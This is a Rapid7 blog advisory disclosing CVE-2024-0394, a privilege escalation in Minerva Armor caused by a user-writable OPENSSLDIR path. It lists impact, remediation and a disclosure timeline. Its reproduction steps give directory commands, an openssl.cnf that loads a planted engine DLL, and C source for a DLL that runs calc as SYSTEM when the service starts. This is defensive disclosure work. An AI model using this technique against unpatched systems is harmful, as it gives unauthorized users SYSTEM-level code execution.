

[![Rapid7 Home](/Areas/Docs/includes/img/r7-nav/Rapid7_logo.svg)](https://www.rapid7.com/)

* Platform
  + TECHNOLOGYThe Rapid7 Command PlatformAI-Powered Cybersecurity Platform[Explore](/platform/)
  + PLATFORM
  + [PlatformELITE TECHNOLOGY](/platform/)
  + [AI-EngineINTELLIGENT TOOLS](/info/ai-hub-page/)
  + [Rapid7 LabsTRUSTED INTELLIGENCE](/research/)
  + SOLUTIONS
  + [Managed Threat CompleteMANAGED XDR](/services/managed-detection-and-response-mdr/)
  + [Surface CommandATTACK SURFACE MANAGEMENT](/products/command/attack-surface-management-asm/)
  + [Exposure CommandEXPOSURE MANAGEMENT](/products/command/exposure-management/)
* [Products](/products/)
  + NEW!Exposure CommandTake Command of Your Attack Surface[Request Demo](/products/command/request-demo/)
  + DETECTION & RESPONSE
  + [Next-Gen SIEMINSIGHTIDR](/products/insightidr/)
  + [Threat IntelligenceTHREAT COMMAND](/products/threat-command/)
  + EXPOSURE MANAGEMENT
  + [Exposure ManagementEXPOSURE COMMAND](/products/command/exposure-management/)
  + [Attack Surface ManagementSURFACE COMMAND](/products/command/attack-surface-management-asm/)
  + [Vulnerability ManagementINSIGHTVM](/products/insightvm/)
  + [Cloud-Native Application ProtectionINSIGHTCLOUDSEC](/products/insightcloudsec/)
  + [Application Security TestingINSIGHTAPPSEC](/products/insightappsec/)
* [Services](/services/)
  + MXDRManaged Threat Complete24x7 MXDR to secure your extended ecosystem[Request Demo](/services/managed-detection-and-response-mdr/demo/)
  + DETECTION & RESPONSE
  + [Managed XDRMANAGED THREAT COMPLETE](/services/managed-detection-and-response-mdr/)
  + [Incident Response ServicesEXPERIENCING A BREACH?](/services/incident-response-customer-escalation/)
  + EXPOSURE MANAGEMENT
  + [Managed Vulnerability ManagementOPTIMIZED RISK ASSESSMENT](/services/managed-services/vulnerability-management/)
  + [Managed Application SecurityMANAGED DAST](/services/managed-services/managed-appsec/)
  + [Continuous Red TeamingVECTOR COMMAND](/services/continuous-red-team-service/)
  + [Penetration Testing ServicesTEST YOUR DEFENSES](/services/security-consulting/penetration-testing-services/)
* Resources
  + NEWThe 2024 Attack Intelligence ReportRead the latest research by Rapid7 Labs[READ NOW](/research/report/2024-attack-intelligence-report/)
  + STAY CURRENT
  + [About Rapid7 LabsMEET THE RESEARCH TEAM](/research/)
  + [Events & WebinarsCATCH US LIVE](/about/events-webcasts/)
  + [Resources LibraryDIVE INTO THE DETAILS](/resources/)
  + [The Rapid7 BlogSTAY UP-TO-DATE](/blog/)
  + [Exploit DatabaseSEARCH THOUSANDS OF CVES](/db/)
  + [Cybersecurity FundamentalsLEARN THE BASICS](/fundamentals/)
  + PRODUCT SUPPORT
  + [Contact SalesTALK TO AN EXPERT](/contact/)
  + [Customer Support PortalCONTACT SUPPORT](/for-customers/)
  + [Product IntegrationsCONNECT EVERYTHING](https://extensions.rapid7.com/)
  + [Product DocumentationPRODUCT AND SERVICES GUIDES](https://docs.rapid7.com/)
  + [Product Release NotesLATEST FEATURES](https://docs.rapid7.com/release-notes/)
  + [Interactive Product ToursTAKE TOUR](/product-tours/)
* [Company](/about/company/)
  + OVERVIEW
  + [About UsOUR STORY](/about/company/)
  + [LeadershipEXECUTIVE TEAM & BOARD](/about/leadership/)
  + [News & Press ReleasesTHE LATEST FROM OUR NEWSROOM](/about/news/)
  + [CareersJOIN RAPID7](https://careers.rapid7.com/)
  + [Our CustomersTheir Success Stories](/customers/)
  + [PartnersRapid7 Partner Ecosystem](/partners/)
  + [InvestorsInvestor Relations](https://investors.rapid7.com/)
  + COMMUNITY & CULTURE
  + [Social GoodOUR COMMITMENT & APPROACH](/about/social-good/)
  + [Rapid7 Cybersecurity FoundationBUILDING THE FUTURE](/about/rapid7-foundation/)
  + [Diversity, Equity & InclusionEMPOWERING PEOPLE](/about/diversity-equity-and-inclusion/)
  + [Open SourceSTRENGTHENING CYBERSECURITY](/open-source/)
  + [Public PolicyENGAGEMENT & ADVOCACY](/about/public-policy/)
  + [Boston BruinsOur Partnership](/about/rapid7-cybersecurity-partner-boston-bruins/)
* [Partners](/partners/)
* en
  + English
* [![](/Areas/Docs/includes/img/r7-nav/icon-lock.svg) Sign In](https://insight.rapid7.com/saml/SSO)
[Blog](/blog/ "Blog")

* Select
  + [Vulnerability Management](/blog/tag/vulnerability-management/)
  + [MDR](/blog/tag/mdr-managed-detection-response/)
  + [Detection & Response](/blog/tag/detection-and-response/)
  + [Cloud Security](/blog/tag/cloud-security/)
  + [App Security](/blog/tag/application-security/)
  + [Metasploit](/blog/tag/metasploit/)
  + [All Topics](/blog/tags/)

[Start Trial](/trial/insight/)[![Rapid7 Home](/Areas/Docs/includes/img/r7-nav/Rapid7_logo.svg)](https://www.rapid7.com/)

* Platform
  + TECHNOLOGYThe Rapid7 Command PlatformAI-Powered Cybersecurity Platform[Explore](/platform/)
  + PLATFORM
  + [PlatformELITE TECHNOLOGY](/platform/)
  + [AI-EngineINTELLIGENT TOOLS](/info/ai-hub-page/)
  + [Rapid7 LabsTRUSTED INTELLIGENCE](/research/)
  + SOLUTIONS
  + [Managed Threat CompleteMANAGED XDR](/services/managed-detection-and-response-mdr/)
  + [Surface CommandATTACK SURFACE MANAGEMENT](/products/command/attack-surface-management-asm/)
  + [Exposure CommandEXPOSURE MANAGEMENT](/products/command/exposure-management/)
* [Products](/products/)
  + NEW!Exposure CommandTake Command of Your Attack Surface[Request Demo](/products/command/request-demo/)
  + DETECTION & RESPONSE
  + [Next-Gen SIEMINSIGHTIDR](/products/insightidr/)
  + [Threat IntelligenceTHREAT COMMAND](/products/threat-command/)
  + EXPOSURE MANAGEMENT
  + [Exposure ManagementEXPOSURE COMMAND](/products/command/exposure-management/)
  + [Attack Surface ManagementSURFACE COMMAND](/products/command/attack-surface-management-asm/)
  + [Vulnerability ManagementINSIGHTVM](/products/insightvm/)
  + [Cloud-Native Application ProtectionINSIGHTCLOUDSEC](/products/insightcloudsec/)
  + [Application Security TestingINSIGHTAPPSEC](/products/insightappsec/)
* [Services](/services/)
  + MXDRManaged Threat Complete24x7 MXDR to secure your extended ecosystem[Request Demo](/services/managed-detection-and-response-mdr/demo/)
  + DETECTION & RESPONSE
  + [Managed XDRMANAGED THREAT COMPLETE](/services/managed-detection-and-response-mdr/)
  + [Incident Response ServicesEXPERIENCING A BREACH?](/services/incident-response-customer-escalation/)
  + EXPOSURE MANAGEMENT
  + [Managed Vulnerability ManagementOPTIMIZED RISK ASSESSMENT](/services/managed-services/vulnerability-management/)
  + [Managed Application SecurityMANAGED DAST](/services/managed-services/managed-appsec/)
  + [Continuous Red TeamingVECTOR COMMAND](/services/continuous-red-team-service/)
  + [Penetration Testing ServicesTEST YOUR DEFENSES](/services/security-consulting/penetration-testing-services/)
* Resources
  + NEWThe 2024 Attack Intelligence ReportRead the latest research by Rapid7 Labs[READ NOW](/research/report/2024-attack-intelligence-report/)
  + STAY CURRENT
  + [About Rapid7 LabsMEET THE RESEARCH TEAM](/research/)
  + [Events & WebinarsCATCH US LIVE](/about/events-webcasts/)
  + [Resources LibraryDIVE INTO THE DETAILS](/resources/)
  + [The Rapid7 BlogSTAY UP-TO-DATE](/blog/)
  + [Exploit DatabaseSEARCH THOUSANDS OF CVES](/db/)
  + [Cybersecurity FundamentalsLEARN THE BASICS](/fundamentals/)
  + PRODUCT SUPPORT
  + [Contact SalesTALK TO AN EXPERT](/contact/)
  + [Customer Support PortalCONTACT SUPPORT](/for-customers/)
  + [Product IntegrationsCONNECT EVERYTHING](https://extensions.rapid7.com/)
  + [Product DocumentationPRODUCT AND SERVICES GUIDES](https://docs.rapid7.com/)
  + [Product Release NotesLATEST FEATURES](https://docs.rapid7.com/release-notes/)
  + [Interactive Product ToursTAKE TOUR](/product-tours/)
* [Company](/about/company/)
  + OVERVIEW
  + [About UsOUR STORY](/about/company/)
  + [LeadershipEXECUTIVE TEAM & BOARD](/about/leadership/)
  + [News & Press ReleasesTHE LATEST FROM OUR NEWSROOM](/about/news/)
  + [CareersJOIN RAPID7](https://careers.rapid7.com/)
  + [Our CustomersTheir Success Stories](/customers/)
  + [PartnersRapid7 Partner Ecosystem](/partners/)
  + [InvestorsInvestor Relations](https://investors.rapid7.com/)
  + COMMUNITY & CULTURE
  + [Social GoodOUR COMMITMENT & APPROACH](/about/social-good/)
  + [Rapid7 Cybersecurity FoundationBUILDING THE FUTURE](/about/rapid7-foundation/)
  + [Diversity, Equity & InclusionEMPOWERING PEOPLE](/about/diversity-equity-and-inclusion/)
  + [Open SourceSTRENGTHENING CYBERSECURITY](/open-source/)
  + [Public PolicyENGAGEMENT & ADVOCACY](/about/public-policy/)
  + [Boston BruinsOur Partnership](/about/rapid7-cybersecurity-partner-boston-bruins/)
* [Partners](/partners/)

* en
  + English
* [![](/Areas/Docs/includes/img/r7-nav/icon-lock.svg)Sign In](https://insight.rapid7.com/saml/SSO)
[![Rapid7 logo](/Areas/Docs/includes/img/r7-nav/Rapid7_logo-short.svg)](https://www.rapid7.com/)

* [Blog](/blog/ "Blog")
* [Vulnerability Management](/blog/tag/vulnerability-management/)
* [MDR](/blog/tag/mdr-managed-detection-response/)
* [Detection & Response](/blog/tag/detection-and-response/)
* [Cloud Security](/blog/tag/cloud-security/)
* [App Security](/blog/tag/application-security/)
* [Metasploit](/blog/tag/metasploit/)
* [All Topics](/blog/tags/)
[Start Trial](/trial/insight/)

# CVE-2024-0394: Rapid7 Minerva Armor Privilege Escalation (FIXED)

* Apr 03, 2024
* 3 min read
* [Dani Kamanovsky](/blog/author/dani/)

*Last updated at Tue, 13 Aug 2024 14:23:44 GMT*

Rapid7 is disclosing CVE-2024-0394, a privilege escalation vulnerability in Rapid7 Minerva’s Armor product family. Minerva uses the open-source OpenSSL library for cryptographic functions and to support secure communications. The root cause of this vulnerability is Minerva’s implementation of OpenSSL’s `OPENSSLDIR` parameter, which was set to a path accessible to low-privileged users (such as `C:\git\vcpkg\packages\openssl_x86-windows-static-vs2019-static\openssl.cnf`). Rapid7 has assessed this vulnerability as having a CVSSv3 score of [7.8](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:F/RL:O/RC:C/MAV:L/MAC:L/MPR:L/MUI:N/MS:C).

## Impact

Since Minerva Armor operates as a Windows service, this vulnerability enables any authenticated user to elevate privileges and execute arbitrary code with SYSTEM privileges. A low-privileged attacker can create an `openssl.cnf` configuration file to load a malicious OpenSSL engine library, resulting in arbitrary code execution as SYSTEM when the service starts.

## Credit

Rapid7 would like to thank Will Dormann of [Vul Labs](https://vu.ls/) for disclosing this vulnerability to us in accordance with [Rapid7's vulnerability disclosure policy](https://www.rapid7.com/disclosure/). We are grateful to Will and the security research community for their work to make software and systems safer for everyone.

## Product Description

Minerva Armor technology is a core endpoint security component (Windows only) aimed at preventing evasive malware, ransomware, and advanced cyber attacks. Armor is operated and trusted by SMBs and enterprise organizations around the world across a diversity of sectors and verticals.

Minerva Armor technology was developed by Minerva Labs, which was [acquired by Rapid7](https://www.rapid7.com/about/press-releases/rapid7-acquires-minerva-labs/) in March 2023. Armor is part of a product family that includes Minerva Armor and Rapid7 next-generation antivirus (NGAV). Armor was previously used as an OEM component in Intego AV. **Note:** The Insight agent is not vulnerable to this issue.

## Exploitation

During the Armor 32-bit service startup (MVArmorService32.exe), Armor loads the OpenSSL library. OpenSSL is a library that provides a variety of cryptographic functions. This library has an internal directory tree that is used to locate the configuration file; this directory is called OPENSSLDIR. Inside OPENSSLDIR resides the configuration file `openssl.cnf`. This is where the privilege escalation opportunity begins.

When the application is dependent on the OpenSSL library, it is necessary to indicate the full path to OPENSSLDIR at compile-time, but at run-time, this path is not necessary. Therefore, it is possible to discover the full path using reverse engineering techniques and tools, such as strings, ProcMon, and others.

If an attacker can place the `openssl.cnf` file and specify a malicious library for loading, the attacker's code is executed instead. The root cause of this vulnerability lies in the OpenSSL library’s configuration in Minerva, where the OPENSSLDIR parameter was set to a path accessible to low-privileged users, such as `C:\git\vcpkg\packages\openssl_x86-windows-static-vs2019-static\openssl.cnf`. Since Armor operates as a Windows service, this vulnerability enables any authenticated user to elevate privileges and execute arbitrary code with SYSTEM privileges. A low-privileged user can create the openssl.cnf configuration file mentioned above to load a malicious OpenSSL engine library, resulting in arbitrary code execution as SYSTEM when the service starts.

Below is a ProcMon capture of the Armor service looking for the `openssl.cnf` file:

![](https://blog.rapid7.com/content/images/2024/04/ProcMon-1.png)

### Steps To Reproduce

All steps are executed as a low-privileged authenticated user:

1. Create a “C:\git\vcpkg\packages\openssl\_x86-windows-static-vs2019-static” directory:

   `mkdir “C:\git\vcpkg\packages\openssl_x86-windows-static-vs2019-static”`
2. Create an `.cnf file` with the following contents:

```
openssl_conf = openssl_init
[openssl_init]
engines = engine_section
[engine_section]
woot = woot_section
[woot_section]
engine_id = woot
dynamic_path = c:\\danik\\calc.dll
init = 0

```

3. Create the c:\danik folder:

   `mkdir “C:\danik”`
4. Compile and link a malicious “OpenSSL library” — the code below will run Windows calculator:

```
#include <windows.h>
BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,
    DWORD fdwReason,
    LPVOID lpReserved )
{
    switch( fdwReason )
    {
        case DLL_PROCESS_ATTACH:
            system("calc");
            break;
        case DLL_THREAD_ATTACH:
         // Do thread-specific initialization.
            break;
        case DLL_THREAD_DETACH:
         // Do thread-specific cleanup.
            break;
        case DLL_PROCESS_DETACH:
         // Perform any necessary cleanup.
            break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}

```

5. Copy `calc.dll` from above to the “C:\danik” directory.
6. Restart the Armor service or the whole machine.

## Remediation

To remediate CVE-2024-0394, Minerva customers should update the latest release:

| Customers | Remediated version |
| --- | --- |
| Minerva customers | Armor version 4.5.5 |
| Minerva Armor OEM customers | Armor OEM version 4.5.5 |

## Disclosure Timeline

**January 8, 2024:** Issue reported to Rapid7 by Will Dormann of [Vul Labs](https://vu.ls/)

**January 9, 2024:** Rapid7 acknowledges report

**January 11, 2024:** Rapid7 reproduces issue, confirms vulnerability

**January - February 2024:** Rapid7 engineering team develops and tests fix, requests information from partner on potentially vulnerable implementation; partner confirms they are no longer offering vulnerable implementation.

**March 12, 2024:** Rapid7 contacts reporter to ask whether our fix timeline had been previously communicated

**March 19, 2024:** Rapid7 assigns CVE, updates reporter on fix readiness, confirms affected/fixed versions. Rapid7 and reporter agree on April 3, 2024 as a coordinated disclosure date.

**April 3, 2024:** This disclosure; fix released.

#### NEVER MISS AN EMERGING THREAT

Be the first to learn about the latest vulnerabilities and cybersecurity news.

Subscribe Now

#### POST TAGS

* [Rapid7 Disclosure](/blog/tag/rapid7-disclosure/ "Rapid7 Disclosure")

#### SHARING IS CARING

#### AUTHOR

[Dani Kamanovsky](/blog/author/dani/ "Dani Kamanovsky")
[View Dani's Posts](/blog/author/dani/)

![](https://blog.rapid7.com/content/images/2024/04/vuln-disclosure-banner.jpeg)

## Topics

* [Metasploit
   *(663)*](/blog/tag/metasploit/)
* [Vulnerability Management
   *(366)*](/blog/tag/vulnerability-management/)
* [Research
   *(243)*](/blog/tag/research/)
* [Detection and Response
   *(207)*](/blog/tag/detection-and-response/)
* [Vulnerability Disclosure
   *(150)*](/blog/tag/vulnerability-disclosure/)
* [Emergent Threat Response
   *(145)*](/blog/tag/emergent-threat-response/)
* [Cloud Security
   *(137)*](/blog/tag/cloud-security/)
* [Security Operations
   *(21)*](/blog/tag/secops/)

## Popular Tags

* [Metasploit](/blog/tag/metasploit/)
* [Metasploit Weekly Wrapup](/blog/tag/metasploit-weekly-wrapup/)
* [Vulnerability Management](/blog/tag/vulnerability-management/)
* [Research](/blog/tag/research/)
* [Detection and Response](/blog/tag/detection-and-response/)
* [Logentries](/blog/tag/logentries/)

## Related Posts

CVE-2022-35629..35632 Velociraptor Multiple Vulnerabilities (FIXED)

[Read More](/blog/post/2022/07/26/cve-2022-35629-35632-velociraptor-multiple-vulnerabilities-fixed/)

Shoring Up the Defenses Together: 2018Q2 and Q3 Wrap-Up

[Read More](/blog/post/2018/10/29/shoring-up-the-defenses-together-2018q2-and-q3-wrap-up/)

Shoring Up the Defenses Together: 2018Q1 Wrap-Up

[Read More](/blog/post/2018/04/10/shoring-up-the-defenses-together-2018q1-wrap-up/)

Vulnerabilities Affecting Four Rapid7 Products (FIXED)

[Read More](/blog/post/2017/10/06/vulnerabilities-affecting-four-rapid7-products-fixed/)

## Related Posts

[Vulnerability Disclosure

CVE-2022-35629..35632 Velociraptor Multiple Vulnerabilities (FIXED)

Read Full Post](/blog/post/2022/07/26/cve-2022-35629-35632-velociraptor-multiple-vulnerabilities-fixed/)

[Vulnerability Disclosure

Shoring Up the Defenses Together: 2018Q2 and Q3 Wrap-Up

Read Full Post](/blog/post/2018/10/29/shoring-up-the-defenses-together-2018q2-and-q3-wrap-up/)

[Vulnerability Disclosure

Shoring Up the Defenses Together: 2018Q1 Wrap-Up

Read Full Post](/blog/post/2018/04/10/shoring-up-the-defenses-together-2018q1-wrap-up/)

[Vulnerability Disclosure

Vulnerabilities Affecting Four Rapid7 Products (FIXED)

Read Full Post](/blog/post/2017/10/06/vulnerabilities-affecting-four-rapid7-products-fixed/)

[View All Posts](/blog/posts/)

Search

[BACK TO TOP
![](/includes/img/up-arrow-lightgray.png?width=1200)](#__)

[![Rapid7 logo](/includes/img/Rapid7_logo.svg?width=1200&quality=90)](/)
CUSTOMER SUPPORT
+1-866-390-8113 (Toll Free)
SALES SUPPORT
+1-866-772-7437 (Toll Free)
Need to report an Escalation or a Breach?
[Get Help](/services/incident-response-customer-escalation/)

SOLUTIONS
[The Command Platform](/platform/)
[Exposure Command](/products/command/exposure-management/)
[Managed Threat Complete](/services/managed-detection-and-response-mdr/)

SUPPORT & RESOURCES
[Product Support](https://www.rapid7.com/for-customers/)
[Resource Library](https://www.rapid7.com/resources/)
[Our Customers](https://www.rapid7.com/customers/)
[Events & Webcasts](https://www.rapid7.com/about/events-webcasts/)
[Training & Certification](https://www.rapid7.com/services/training-certification/)
[Cybersecurity Fundamentals](https://www.rapid7.com/fundamentals/)
[Vulnerability & Exploit Database](https://www.rapid7.com/db/)

ABOUT US
[Company](https://www.rapid7.com/about/company/)
[Diversity, Equity, and Inclusion](https://www.rapid7.com/about/diversity-equity-and-inclusion/)
[Leadership](https://www.rapid7.com/about/leadership/)
[News & Press Releases](https://www.rapid7.com/about/news/)
[Public Policy](https://www.rapid7.com/about/public-policy/)
[Open Source](https://www.rapid7.com/open-source/)
[Investors](https://investors.rapid7.com/overview/default.aspx)

CONNECT WITH US
[Contact](https://www.rapid7.com/contact/)
[Blog](https://www.rapid7.com/blog/)
[Support Login](https://insight.rapid7.com/login)
[Careers](https://careers.rapid7.com/careers-home)

© Rapid7
[Legal Terms](/legal/)
  |   [Privacy Policy](/privacy-policy/)
  |   [Export Notice](/export-notice/)
  |   [Trust](/trust/)
  |   Do Not Sell or Share My Personal Information
  |   Cookie Preferences

Contact Us

## Submit your information and we will get in touch with you.

#### Thank you for contacting us.

##### We will be in touch shortly.

![Rapid7 logo](/includes/img/logo-black.png)

### General:

info@rapid7.com

### Sales:

+1-866-772-7437
sales@rapid7.com

### Support:

+1–866–390–8113 (toll free)
support@rapid7.com

### Incident Response:

1-844-727-4347

[More Contact Info](/contact/)

## Never miss a blog

Get the latest stories, expertise, and news about security today.

You’re almost done!
 Check your email to confirm your subscription.

